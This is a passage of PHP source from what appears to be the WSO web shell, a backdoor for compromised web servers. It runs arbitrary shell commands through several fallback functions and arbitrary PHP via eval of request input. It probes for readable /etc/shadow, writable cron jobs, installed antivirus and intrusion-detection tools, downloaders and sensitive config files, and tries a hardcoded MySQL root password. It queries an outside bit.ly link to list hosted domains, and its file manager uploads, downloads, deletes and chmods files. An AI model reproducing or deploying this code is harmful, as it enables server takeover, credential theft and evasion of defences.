							if( isset($matches[1]) && @is_file($matches[1]) && @is_writable($matches[1]) ) {
								$files[$file][] = $matches[1];
							}
						}
					}
				}
			}
		}
		catch(Exception $e) {
		}
		$writable_cron_jobs = '';
		foreach ($files as $cron_file => $target_files) {
			$writable_cron_jobs .= $cron_file.': '.implode(', ', $target_files)."\n";
		}
		return $writable_cron_jobs;
	}
	function wsoEx($in) {
		try {
			$out = '';
			if (function_exists('passthru')) {
				ob_start();
				@passthru($in);
				$out = ob_get_clean();
			}
			elseif (function_exists('system')) {
				ob_start();
				@system($in);
				$out = ob_get_clean();
			}
			elseif (function_exists('shell_exec')) {
				$out = shell_exec($in);
			}
			elseif (is_resource($f = @popen($in, "r"))) {
				$out = "";
				while (!@feof($f)) $out.= fread($f, 1024);
				pclose($f);
			}
			elseif (function_exists('exec')) {
				@exec($in, $out);
				$out = @join("\n", $out);
			}
			elseif (function_exists('proc_open')) {
				$descriptorspec = array( 0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w") );
				$process = proc_open($in, $descriptorspec, $pipes, null, null);
				if (is_resource($process)) {
					fclose($pipes[0]);
					$out = stream_get_contents($pipes[1]);
					$out .= stream_get_contents($pipes[2]);
					fclose($pipes[1]);
					fclose($pipes[2]);
					proc_close($process);
				}
			}
			elseif (function_exists('expect_popen')) {
				$out = @file_get_contents('expect://' . $in);
			}
			elseif ( PHPVERSION[0]==7 && PHPVERSION<'7.4.26' || PHPVERSION[0]==8 && PHPVERSION<'8.0.13' ) {
				global $wsoExGentlyUrl;
				if( $wsoExGentlyUrl ) {
					ob_start();
					echo wsoExGently($in);
					$out = ob_get_clean();
					$wsoExGentlyUrl = '';
				}
			}
			else {
				$out = "↳ Can't exec commands. But we still have PHP!";
			}
		}
		catch(Exception $e) {
			$out = $e->getMessage();
		}
		return $out;
	}
	function wsoViewSize($s) {
		if ($s >= 1073741824) return sprintf('%1.2f', $s / 1073741824) . ' GB';
		elseif ($s >= 1048576) return sprintf('%1.2f', $s / 1048576) . ' MB';
		elseif ($s >= 1024) return sprintf('%1.2f', $s / 1024) . ' KB';
		else return $s . ' B';
	}
	function wsoPerms($p) {
		if (($p & 0xC000) == 0xC000) $i = 's';
		elseif (($p & 0xA000) == 0xA000) $i = 'l';
		elseif (($p & 0x8000) == 0x8000) $i = '-';
		elseif (($p & 0x6000) == 0x6000) $i = 'b';
		elseif (($p & 0x4000) == 0x4000) $i = 'd';
		elseif (($p & 0x2000) == 0x2000) $i = 'c';
		elseif (($p & 0x1000) == 0x1000) $i = 'p';
		else $i = 'u';
		$i.= (($p & 0x0100) ? 'r' : '-');
		$i.= (($p & 0x0080) ? 'w' : '-');
		$i.= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
		$i.= (($p & 0x0020) ? 'r' : '-');
		$i.= (($p & 0x0010) ? 'w' : '-');
		$i.= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
		$i.= (($p & 0x0004) ? 'r' : '-');
		$i.= (($p & 0x0002) ? 'w' : '-');
		$i.= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
		return $i;
	}
	function wsoPermsColor($f) {
		if (!@is_readable($f)) return '<font class=text-red>' . wsoPerms(@fileperms($f)) . '</font>';
		elseif (!@is_writable($f)) return '<font color=white>' . wsoPerms(@fileperms($f)) . '</font>';
		else return '<font class=text-green>' . wsoPerms(@fileperms($f)) . '</font>';
	}
	function wsoPermsColorOnly($f) {
		if (!@is_readable($f)) return '#f18260';
		elseif (!@is_writable($f)) return '#fff';
		else return '#2bb24c';
	}
	function wsoScandir($dir) {
		if (function_exists("scandir")) {
			return scandir($dir);
		} else {
			$dh = opendir($dir);
			while (false !== ($filename = readdir($dh))) $files[] = $filename;
			return $files;
		}
	}
	function actionSecInfo() {
		wsoHeader();
		echo '<h1>Server security information</h1><div class=content>';
		function wsoSecParam($n, $v) {
			$v = trim($v);
			if ($v) {
				echo '<span>' . $n . ': </span>';
				if (strpos($v, "\n") === false) echo $v . '<br>';
				else echo '<pre class=ml1>' . $v . '</pre>';
				flush();
			}
		}
		wsoSecParam('Server software', @getenv('SERVER_SOFTWARE'));
		if (function_exists('apache_get_modules')) wsoSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
		wsoSecParam('Disabled PHP Functions', $GLOBALS['disable_functions'] ? $GLOBALS['disable_functions'] : 'none');
		wsoSecParam('Open base dir', @ini_get('open_basedir'));
		wsoSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
		wsoSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
		wsoSecParam('cURL support', function_exists('curl_version') ? 'enabled' : 'no');
		wsoSecParam('Open ports & sockets', wsoGetOpenPorts());
		echo '<br>';
		wsoSecParam('Writable cron jobs', wsoGetCronJobs());
		echo '<br>';
		$temp = array();
		try {
			$res = @new PDO("mysql:host=localhost;", 'root', 'mayflowerr');
		}
		catch(Exception $e) {
			if (preg_match('/Access denied/i', $e->getMessage())) $temp[] = "MySql (PDO)";
		}
		if (@class_exists('Redis')) {
			try {
				$redis = new Redis();
				$redis->connect('127.0.0.1', 6379);
				$status = $redis->info()['redis_version'];
			}
			catch(Exception $e) {
				$status = $e->getMessage();
			}
			$temp[] = "Redis (".$status.")";
		}
		if (@function_exists('mssql_connect')) $temp[] = "MSSQL";
		if (@function_exists('pg_connect')) $temp[] = "PostgreSQL";
		if (@function_exists('oci_connect')) $temp[] = "Oracle";
		wsoSecParam('Supported databases', implode(', ', $temp));
		echo '<br>';
		preg_match('/"domains":\[(.+)\]/', wsoGetFile("http://bit.ly/geo133t"), $matches);
		wsoSecParam('Domains', str_replace(',', "\n", str_replace('"', '', isset($matches[1])?$matches[1]:'no domains on this host')));
		echo '<br>';
		if ($GLOBALS['os'] == 'nix') {
			wsoSecParam('Readable /etc/passwd', @is_readable('/etc/passwd') ? "yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>" : 'no');
			wsoSecParam('Readable /etc/shadow', @is_readable('/etc/shadow') ? "yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"shadow\")'>[view]</a>" : 'no');
			wsoSecParam('OS version', @file_get_contents('/proc/version'));
			wsoSecParam('Distr name', @file_get_contents('/etc/issue.net'));
			echo '<br>';
			if (!$GLOBALS['safe_mode']) {
				$userful = array('gcc', 'lcc', 'cc', 'ld', 'make', 'php', 'perl', 'python', 'ruby', 'tar', 'gzip', 'bzip', 'bzip2', 'nc', 'locate', 'suidperl');
				$userful_exists = array();
				$danger = array('kav', 'nod32', 'bdcored', 'uvscan', 'sav', 'drwebd', 'clamd', 'rkhunter', 'chkrootkit', 'iptables', 'ipfw', 'tripwire', 'shieldcc', 'portsentry', 'snort', 'ossec', 'lidsadm', 'tcplodg', 'sxid', 'logcheck', 'logwatch', 'sysmask', 'zmbscap', 'sawmill', 'wormscan', 'ninja');
				$danger_exists = array();
				$downloaders = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror');
				$downloaders_exists = array();
				foreach (explode(':', getenv('PATH')?getenv('PATH'):'/usr/local/bin:/usr/bin:/usr/sbin') as $path) {
					foreach ($userful as $bin_name) {
						if( bindtextdomain(rand(1e5,1e6), $path.'/'.$bin_name) ) $userful_exists[] = $bin_name;
					}
					foreach ($danger as $bin_name) {
						if( bindtextdomain(rand(1e5,1e6), $path.'/'.$bin_name) ) $danger_exists[] = $bin_name;
					}
					foreach ($downloaders as $bin_name) {
						if( bindtextdomain(rand(1e5,1e6), $path.'/'.$bin_name) ) $downloaders_exists[] = $bin_name;
					}
				}
				wsoSecParam('Userful', implode(', ', $userful_exists));
				wsoSecParam('Danger', implode(', ', $danger_exists));
				wsoSecParam('Downloaders', implode(', ', $downloaders_exists));
				$interesting = array("/etc/os-release", "/etc/passwd", "/etc/shadow", "/etc/group", "/etc/issue", "/etc/issue.net", "/etc/motd", "/etc/sudoers", "/etc/hosts", "/etc/aliases","/proc/version", "/etc/resolv.conf", "/etc/sysctl.conf","/etc/named.conf", "/etc/network/interfaces", "/etc/squid/squid.conf", "/usr/local/squid/etc/squid.conf","/etc/ssh/sshd_config","/etc/httpd/conf/httpd.conf", "/usr/local/apache2/conf/httpd.conf", " /etc/apache2/apache2.conf", "/etc/apache2/httpd.conf", "/usr/pkg/etc/httpd/httpd.conf", "/usr/local/etc/apache22/httpd.conf", "/usr/local/etc/apache2/httpd.conf", "/var/www/conf/httpd.conf", "/etc/apache2/httpd2.conf", "/etc/httpd/httpd.conf","/etc/lighttpd/lighttpd.conf", "/etc/nginx/nginx.conf","/etc/fstab", "/etc/mtab", "/etc/crontab", "/etc/cron.d/", "/var/spool/cron/crontabs", "/etc/inittab", "/etc/modules.conf", "/etc/modules");
				$interesting_exists = array();
				foreach ($interesting as $path) {
					if( bindtextdomain(rand(1e5,1e6), $path) ) $interesting_exists[] = $path;
				}
				wsoSecParam('Interesting', implode("\n", $interesting_exists));
				echo '<br/>';
				wsoSecParam('HDD space', wsoEx('df -h'));
				wsoSecParam('Hosts', @file_get_contents('/etc/hosts'));
				echo '<br/><span>posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form>';
				if (isset($_POST['p2'], $_POST['p3']) && is_numeric($_POST['p2']) && is_numeric($_POST['p3'])) {
					$temp = "";
					for (;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) {
						$uid = @posix_getpwuid($_POST['p2']);
						if ($uid) $temp.= join(':', $uid) . "\n";
					}
					echo '<br/>';
					wsoSecParam('Users', $temp);
				}
			}
		} else {
			wsoSecParam('OS Version', wsoEx('ver'));
			wsoSecParam('Account Settings', wsoEx('net accounts'));
			wsoSecParam('User Accounts', wsoEx('net user'));
		}
		echo '</div>';
		wsoFooter();
	}
	function actionPhp() {
		if (isset($_POST['ajax'])) {
			WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true);
			ob_start();
			try {
				eval($_POST['p1']);
			}
			catch(Exception $e) {
				echo $e->getMessage();
			}
			$temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "\n\r\t\\'\0") . "';\n";
			echo strlen($temp), "\n", $temp;
			exit;
		}
		if (empty($_POST['ajax']) && !empty($_POST['p1'])) WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);
		wsoHeader();
		if (isset($_POST['p2']) && ($_POST['p2'] == 'info')) {
			echo '<h1>PHP info</h1><div class=content><style>.p {color:#000;}</style>';
			ob_start();
			phpinfo();
			$tmp = ob_get_clean();
			$tmp = preg_replace(array('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU', '!td, th {(.*)}!msiU', '!<img[^>]+>!msiU',), array('', '.e, .v, .h, .h th {$1}', ''), $tmp);
			echo str_replace('<h1', '<h2', $tmp) . '</div><br>';
		}
		echo '<h1>Execution PHP-code</h1>
		<div class=content><form name=pf method=post onsubmit="a(\'Php\',null,PhpCode.value);return false;" onkeydown="tryToRun(event,this)">
		<textarea name=code class=bigarea id=PhpCode>' . (!empty($_POST['p1']) ? htmlspecialchars($_POST['p1']) : '') . '</textarea>
		<span>Use [ ⌘/CTRL+Enter ] to run</span>';
		echo ' <input type=hidden name=ajax value=1></form><pre id=PhpOutput style="' . (empty($_POST['p1']) ? 'display:none;' : '') . 'margin-top:5px;" class=ml1>';
		if (!empty($_POST['p1'])) {
			ob_start();
			try {
				eval($_POST['p1']);
			}
			catch(Exception $e) {
				echo $e->getMessage();
			}
			echo htmlspecialchars(ob_get_clean());
		}
		echo '</pre></div>';
		wsoFooter();
	}
	function actionFilesMan() {
		if (is_file($_POST['c'])) {
			$_POST['c'] = preg_match('#^/#', $_POST['c'])?$_POST['c']:$GLOBALS['cwd'].$_POST['c'];
			$_POST['c'] = explode('/', $_POST['c']);
			$_POST['p1'] = array_pop($_POST['c']);
			$_POST['c'] = implode('/', $_POST['c']);
			actionFilesTools();
			die();
		}
		if (!empty($_COOKIE['f'])) {
			$_COOKIE['f'] = @unserialize($_COOKIE['f']);
		}
		if (!empty($_POST['p1'])) {
			switch ($_POST['p1']) {
				case 'uploadFile':
					if (!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])) echo "Can't upload file!";
					break;
				case 'mkdir':
					if (!@mkdir($_POST['p2'])) echo "Can't create new dir";
					break;
				case 'delete':
					function deleteDir($file_path) {
						$file_path = (substr($file_path, -1) == '/') ? $file_path : $file_path . '/';
						$dh = opendir($file_path);
						while (($item = readdir($dh)) !== false) {
							$item = $file_path . $item;
							if ((basename($item) == "..") || (basename($item) == ".")) continue;
							$type = filetype($item);
							if ($type == "dir") deleteDir($item);
							else @unlink($item);
						}
						closedir($dh);
						@rmdir($file_path);
					}
					if (is_array(@$_POST['f'])) foreach ($_POST['f'] as $f) {
						if ($f == '..') continue;
						$f = urldecode($f);
						if (is_dir($f)) deleteDir($f);
						else @unlink($f);
					}
					break;
				case 'paste':
					if ($_COOKIE['act'] == 'copy') {
						function copy_paste($c, $s, $d) {
							if (is_dir($c . $s)) {
								mkdir($d . $s);
								$h = @opendir($c . $s);
								while (($f = @readdir($h)) !== false) if (($f != ".") and ($f != "..")) copy_paste($c . $s . '/', $f, $d . $s . '/');
							} elseif (is_file($c . $s)) @copy($c . $s, $d . $s);
						}
						foreach ($_COOKIE['f'] as $f) copy_paste($_COOKIE['c'], $f, $GLOBALS['cwd']);
					} elseif ($_COOKIE['act'] == 'move') {
						function move_paste($c, $s, $d) {
							if (is_dir($c . $s)) {
								mkdir($d . $s);
								$h = @opendir($c . $s);
								while (($f = @readdir($h)) !== false) if (($f != ".") and ($f != "..")) copy_paste($c . $s . '/', $f, $d . $s . '/');
							} elseif (@is_file($c . $s)) @copy($c . $s, $d . $s);
						}
						foreach ($_COOKIE['f'] as $f) @rename($_COOKIE['c'] . $f, $GLOBALS['cwd'] . $f);
					} elseif ($_COOKIE['act'] == 'zip') {
						if (class_exists('ZipArchive')) {
							$zip = new ZipArchive();
							if ($zip->open($_POST['p2'], 1)) {
								chdir($_COOKIE['c']);
								foreach ($_COOKIE['f'] as $f) {
									if ($f == '..') continue;
									if (@is_file($_COOKIE['c'] . $f)) $zip->addFile($_COOKIE['c'] . $f, $f);
									elseif (@is_dir($_COOKIE['c'] . $f)) {
										$iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f . '/'));
										foreach ($iterator as $key => $value) {
											$zip->addFile(realfile_path($key), $key);
										}
									}
								}
								chdir($GLOBALS['cwd']);
								$zip->close();
							}
						}
					} elseif ($_COOKIE['act'] == 'unzip') {
						if (class_exists('ZipArchive')) {
							$zip = new ZipArchive();
							foreach ($_COOKIE['f'] as $f) {
								if ($zip->open($_COOKIE['c'] . $f)) {
									$zip->extractTo($GLOBALS['cwd']);
									$zip->close();
								}
							}
						}
					} elseif ($_COOKIE['act'] == 'tar') {
						chdir($_COOKIE['c']);
						$_COOKIE['f'] = array_map('escapeshellarg', $_COOKIE['f']);
						wsoEx('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_COOKIE['f']));
						chdir($GLOBALS['cwd']);
					}
					unset($_COOKIE['f']);
					setcookie('f', '', time() - 3600);
					break;
				default:
					if (!empty($_POST['p1'])) {
						WSOsetcookie('act', $_POST['p1']);
						WSOsetcookie('f', serialize(@$_POST['f']));
						WSOsetcookie('c', @$_POST['c']);
					}
					break;
				}
			}
			wsoHeader();
			wsoBreadCrumps();
			echo '<div class=content><script>p1_=p2_=p3_="";</script>';
			$dirContent = wsoScandir(isset($_POST['c']) ? $_POST['c'] : $GLOBALS['cwd']);
			if ($dirContent === false) {
				echo 'Can\'t open this folder!';
				wsoFooter();
				return;
			}
			global $sort;
			$sort = array('name', 1);
			if (!empty($_POST['p1'])) {
				if (preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match)) $sort = array($match[1], (int)$match[2]);
			}
			echo "<script>
					function sa() {
						for(i=0;i<d.files.elements.length;i++) {
							d.files.elements[i].checked = d.files.elements[i].type=='checkbox'?d.files.elements[0].checked:false;
						}
					}
				</script>
				<table width='100%' class='main' cellspacing='0' cellpadding='2'>
				<form name=files method=post>
				<tr>
				<th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th>
				<th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_" . ($sort[1] ? 0 : 1) . "\")'>Name</a></th>
				<th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_" . ($sort[1] ? 0 : 1) . "\")'>Size</a></th>
				<th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_" . ($sort[1] ? 0 : 1) . "\")'>Modify</a></th>
				<th>Owner/Group</th>
				<th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_" . ($sort[1] ? 0 : 1) . "\")'>Permissions</a></th>
				<th>Actions</th>
				</tr>";
			$dirs = $files = array();
			$n = count($dirContent);
			for ($i = 0;$i < $n;$i++) {
				$ow = @posix_getpwuid(@fileowner($dirContent[$i]));
				$gr = @posix_getgrgid(@filegroup($dirContent[$i]));
				$tmp = array('name' => $dirContent[$i], 'file_path' => $GLOBALS['cwd'] . $dirContent[$i], 'modify' => date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])), 'perms' => wsoPermsColor($GLOBALS['cwd'] . $dirContent[$i]), 'size' => @filesize($GLOBALS['cwd'] . $dirContent[$i]), 'owner' => $ow['name'] ? $ow['name'] : @fileowner($dirContent[$i]), 'group' => $gr['name'] ? $gr['name'] : @filegroup($dirContent[$i]));
				if (@is_file($GLOBALS['cwd'] . $dirContent[$i])) $files[] = array_merge($tmp, array('type' => 'file'));
				elseif (@is_link($GLOBALS['cwd'] . $dirContent[$i])) $dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['file_path'])));
				elseif (@is_dir($GLOBALS['cwd'] . $dirContent[$i]) && ($dirContent[$i] != ".")) $dirs[] = array_merge($tmp, array('type' => 'dir'));
			}
			$GLOBALS['sort'] = $sort;
			function wsoCmp($a, $b) {
				if ($GLOBALS['sort'][0] != 'size') return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]])) * ($GLOBALS['sort'][1] ? 1 : -1);
				else return (($a['size'] < $b['size']) ? -1 : 1) * ($GLOBALS['sort'][1] ? 1 : -1);
			}
			usort($files, "wsoCmp");
			usort($dirs, "wsoCmp");
			$files = array_merge($dirs, $files);
			$l = 0;
			foreach ($files as $f) {
				$file_style = 'style="color:' . wsoPermsColorOnly($GLOBALS['cwd'] . $f['name']) . '"';
				echo '<tr' . ($l ? ' class=l1' : '') . '>
							<td><input type=checkbox name="f[]" value="' . urlencode($f['name']) . '" class=chkbx></td>
							<td><a ' . $file_style . ' href="javascript:' . (!@is_readable($GLOBALS['cwd'] . $f['name']) ? '">' . ($f['type'] == 'dir' ?'[ '.htmlspecialchars($f['name']).' ]':htmlspecialchars($f['name'])) : ($f['type'] == 'file' ? 'g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\',\'' . (is_writable($GLOBALS['cwd'] . $f['name']) ? 'edit' : 'view') . '\')">' . htmlspecialchars($f['name']) : 'g(\'FilesMan\',\'' . $f['file_path'] . '\')" ' . (empty($f['link']) ? '' : 'title="' . $f['link'] . '"') . '><b>'.($f['type'] == 'dir' ?'[ '.htmlspecialchars($f['name']).' ]':htmlspecialchars($f['name'])).'</b>')) . '</a></td>
							<td>' . ($f['type'] == 'file' ? wsoViewSize($f['size']) : $f['type']) . '</td>
							<td><input type=text value="' . $f['modify'] . '" title="' . $f['name'] . '" class="touch-field hoverable"></td>
							<td>' . $f['owner'] . '/' . $f['group'] . '</td>
							<td><a href=\'javascript:p=prompt("enter new permissions, like 0777","' . substr(sprintf('%o', fileperms($f['name'])), -4) . '");p&&g("FilesTools",null,"' . urlencode($f['name']) . '","chmod",p)\'>' . $f['perms'] . '</a></td>
							<td>
								<a href=# title="'.$f['name'].'" class="copy">[ copy name ]</a>
								<a href=# title="'.$GLOBALS['cwd'].$f['name'].'" class="copy">[ copy path ]</a>
								<a href=\'javascript:p=prompt("enter new filename","' . urlencode($f['name']) . '");p&&g("FilesTools",null,"' . urlencode($f['name']) . '","rename",p)\'>[ rename ]</a>
							</td>
							</tr>';
				$l = $l ? 0 : 1;
			}
			echo "
				<tr><td colspan=7 class=file-actions>
				<input type=hidden name=a value='FilesMan'>
				<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'>
				<input type='submit' name='p1' value='copy' />
				<input type='submit' name='p1' value='move' />
				<input type='submit' name='p1' value='delete' /> ";
			if (class_exists('ZipArchive')) {
				echo "<input type='submit' name='p1' value='zip' /> <input type='submit' name='p1' value='unzip' /> ";
			}
			echo "<input type='submit' name='p1' value='tar' /> ";
			if (!empty($_COOKIE['act']) && count($_COOKIE['f'])) {
				echo "<input type='submit' name='p1' value='paste' /> ";
			}
			if (!empty($_COOKIE['act']) && @count($_COOKIE['f']) && (($_COOKIE['act'] == 'zip') || ($_COOKIE['act'] == 'tar'))) {
				echo "file name: <input type=text name=p2 value='wso_" . date("Ymd_His") . "." . ($_COOKIE['act'] == 'zip' ? 'zip' : 'tar.gz') . "'>";
			}
			echo "
				</td>
				</tr></form></table>
				</div>";
			wsoFooter();
		}
		function actionStringTools() {
			if (!function_exists('hex2bin')) {
				function hex2bin($p) {
					return decbin(hexdec($p));
				}
			}
			if (!function_exists('binhex')) {
				function binhex($p) {
					return dechex(bindec($p));
				}
			}
			if (!function_exists('hex2ascii')) {
				function hex2ascii($p) {
					$r = '';
					for ($i = 0;$i < strLen($p);$i+= 2) {
						$r.= chr(hexdec($p[$i] . $p[$i + 1]));
					}
					return $r;
				}
			}
			if (!function_exists('ascii2hex')) {
				function ascii2hex($p) {
					$r = '';
					for ($i = 0;$i < strlen($p);++$i) $r.= sprintf('%02X', ord($p[$i]));
					return strtoupper($r);
				}
			}
			if (!function_exists('full_urlencode')) {
				function full_urlencode($p) {
					$r = '';
					for ($i = 0;$i < strlen($p);++$i) $r.= '%' . dechex(ord($p[$i]));
					return strtoupper($r);
				}
			}
			$stringTools = array('Base64 encode' => 'base64_encode', 'Base64 decode' => 'base64_decode', 'Url encode' => 'urlencode', 'Url decode' => 'urldecode', 'Full urlencode' => 'full_urlencode', 'md5 hash' => 'md5', 'sha1 hash' => 'sha1', 'crypt' => 'crypt', 'CRC32' => 'crc32', 'ASCII to HEX' => 'ascii2hex', 'HEX to ASCII' => 'hex2ascii', 'HEX to DEC' => 'hexdec', 'HEX to BIN' => 'hex2bin', 'DEC to HEX' => 'dechex', 'DEC to BIN' => 'decbin', 'BIN to HEX' => 'binhex', 'BIN to DEC' => 'bindec', 'String to lower case' => 'strtolower', 'String to upper case' => 'strtoupper', 'Htmlspecialchars' => 'htmlspecialchars', 'String length' => 'strlen',);
			if (isset($_POST['ajax'])) {
				WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true);
				ob_start();
				if (in_array($_POST['p1'], $stringTools)) echo $_POST['p1']($_POST['p2']);
				$temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "\n\r\t\\'\0") . "';\n";
				echo strlen($temp), "\n", $temp;
				exit;
			}
			if (empty($_POST['ajax']) && !empty($_POST['p1'])) WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);
			wsoHeader();
			echo '<h1>String conversions</h1><div class=content>';
			echo "<form name='toolsForm' onSubmit='a(null,null,this.selectTool.value,this.input.value);return false;'><select name='selectTool'>";
			foreach ($stringTools as $k => $v) echo "<option value='" . htmlspecialchars($v) . "'>" . $k . "</option>";
			echo "</select><input type='submit' value='>>'/> <input type=hidden name=ajax value=1><br><textarea name='input' style='margin-top:5px' class=bigarea>" . (empty($_POST['p1']) ? '' : htmlspecialchars(@$_POST['p2'])) . "</textarea></form><pre class='ml1' style='" . (empty($_POST['p1']) ? 'display:none;' : '') . "margin-top:5px' id='strOutput'>";
			if (!empty($_POST['p1'])) {
				if (in_array($_POST['p1'], $stringTools)) echo htmlspecialchars($_POST['p1']($_POST['p2']));
			}
			echo "</pre></div><br><h1>Search files:</h1><div class=content>
			<form onsubmit=\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\"><table cellpadding='1' cellspacing='0' width='50%'>
				<tr><td width='1%'>Text:</td><td><input type='text' name='text' style='width:100%'></td></tr>
				<tr><td>Path:</td><td><input type='text' name='cwd' value='" . htmlspecialchars($GLOBALS['cwd']) . "' style='width:100%'></td></tr>
				<tr><td>Name:</td><td><input type='text' name='filename' value='*' style='width:100%'></td></tr>
				<tr><td></td><td><input type='submit' value='>>'></td></tr>
				</table></form>";
			function wsoRecursiveGlob($file_path) {
				if (substr($file_path, -1) != '/') $file_path.= '/';
				$file_paths = @array_unique(@array_merge(@glob($file_path . $_POST['p3']), @glob($file_path . '*', GLOB_ONLYDIR)));
				if (is_array($file_paths) && @count($file_paths)) {
					foreach ($file_paths as $item) {
						if (@is_dir($item)) {
							if ($file_path != $item) wsoRecursiveGlob($item);
						} else {
							if (empty($_POST['p2']) || @strpos(@file_get_contents($item), $_POST['p2']) !== false) echo "<a href='#' onclick='g(\"FilesTools\",null,\"" . urlencode($item) . "\", \"view\",\"\")'>" . htmlspecialchars($item) . "</a><br>";
						}
					}
				}
			}
			if (@$_POST['p3']) wsoRecursiveGlob($_POST['c']);
			echo "</div><br><h1>Search for hash:</h1><div class=content>
			<form method='post' target='_blank' name='hf'>
				<input type='text' name='hash' style='width:200px;'><br>
				<input type='hidden' name='act' value='find'/>
				<input type='button' value='hashcracking.ru' onclick=\"document.hf.action='https://hashcracking.ru/index.php';document.hf.submit()\"><br>
				<input type='button' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>
				<input type='button' value='crackfor.me' onclick=\"document.hf.action='http://crackfor.me/index.php';document.hf.submit()\"><br>
			</form></div>";
			wsoFooter();
		}
		function actionFilesTools() {
			if (isset($_POST['p1'])) $_POST['p1'] = urldecode($_POST['p1']);
			if (@$_POST['p2'] == 'download') {
				if (@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
					ob_start("ob_gzhandler", 4096);
					header("Content-Disposition: attachment; filename=" . basename($_POST['p1']));
					if (function_exists("mime_content_type")) {
						$type = @mime_content_type($_POST['p1']);
						header("Content-Type: " . $type);
					} else header("Content-Type: application/octet-stream");
					$fp = @fopen($_POST['p1'], "r");
					if ($fp) {
						while (!@feof($fp)) echo @fread($fp, 1024);
						fclose($fp);
					}
				}
				exit;
			}
			if (@$_POST['p2'] == 'mkfile') {
				if (!file_exists($_POST['p1'])) {
					$fp = @fopen($_POST['p1'], 'w');
					if ($fp) {
						$_POST['p2'] = "edit";
						fclose($fp);
					}
				}
			}
			wsoHeader();
			wsoBreadCrumps();
			echo '<div class=content>';
			if (!file_exists(@$_POST['p1'])) {
				echo 'File not exists';
				wsoFooter();
				return;
			}
			$uid = @posix_getpwuid(@fileowner($_POST['p1']));
			if (!$uid) {
				$uid['name'] = @fileowner($_POST['p1']);
				$gid['name'] = @filegroup($_POST['p1']);
			} else $gid = @posix_getgrgid(@filegroup($_POST['p1']));
			echo '<span>Name:</span> ' . htmlspecialchars(@basename($_POST['p1'])) . ' <span>Size:</span> ' . (is_file($_POST['p1']) ? wsoViewSize(filesize($_POST['p1'])) : '-') . ' <span>Permission:</span> ' . wsoPermsColor($_POST['p1']) . ' <span>Owner/Group:</span> ' . $uid['name'] . '/' . $gid['name'] . '<br>';
			echo '<span>Create time:</span> ' . date('Y-m-d H:i:s', filectime($_POST['p1'])) . ' <span>Access time:</span> ' . date('Y-m-d H:i:s', fileatime($_POST['p1'])) . ' <span>Modify time:</span> ' . date('Y-m-d H:i:s', filemtime($_POST['p1'])) . '<br><br>';
			if (empty($_POST['p2'])) $_POST['p2'] = 'view';
			if (is_file($_POST['p1'])) $m = is_writable($_POST['p1']) ? array('View', 'Download', 'Edit', 'Chmod', 'Rename', 'Touch') : array('View', 'Download');
			else $m = array('Chmod', 'Rename', 'Touch');
			foreach ($m as $v) echo '<a href=# onclick="g(null,null,\'' . urlencode($_POST['p1']) . '\',\'' . strtolower($v) . '\')">' . ((strtolower($v) == @$_POST['p2']) ? '<b>[ ' . $v . ' ]</b>' : $v) . '</a> ';
			echo '<br><br>';
			switch ($_POST['p2']) {
				case 'view':
					echo '<textarea id="textarea">';
					$fp = @fopen($_POST['p1'], 'r');
					if ($fp) {
						while (!@feof($fp)) echo htmlspecialchars(@fread($fp, 1024));
						@fclose($fp);
					}
					echo '</textarea>';
					break;
				case 'chmod':
					if (!empty($_POST['p3'])) {
						$perms = 0;
						for ($i = strlen($_POST['p3']) - 1;$i >= 0;--$i) $perms+= (int)$_POST['p3'][$i] * pow(8, (strlen($_POST['p3']) - $i - 1));
						if (!@chmod($_POST['p1'], $perms)) echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
					}
					clearstatcache();
					echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',\'chmod\',this.chmod.value);return false;"><input type=text name=chmod value="' . substr(sprintf('%o', fileperms($_POST['p1'])), -4) . '"><input type=submit value=">>"></form>';
					break;
				case 'edit':
